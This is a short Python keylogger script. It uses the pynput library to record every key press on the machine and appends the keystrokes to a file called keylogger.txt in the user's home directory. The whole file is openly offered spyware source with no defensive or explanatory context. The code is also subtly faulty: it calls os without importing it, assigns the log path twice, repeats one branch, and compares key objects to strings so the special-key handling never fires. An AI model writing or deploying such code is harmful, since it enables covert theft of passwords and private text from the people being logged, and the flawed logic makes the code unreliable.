from pynput.keyboard import Listener

log_file = "Keylog.txt"
log_file = os.path.expanduser("~") + "/keylogger.txt"
def on_press(key):
    if key == "Key.space":
        key = " "

    elif key == "Key.enter":
        key = " "

    elif key == "Key.tab":
        key = " "

    elif key == "Key.enter":
        key = " "

    key = str(key).replace("'", "")
    with open(log_file, "a") as f:
        f.write(key)

with Listener(on_press=on_press) as Listener:
    Listener.join()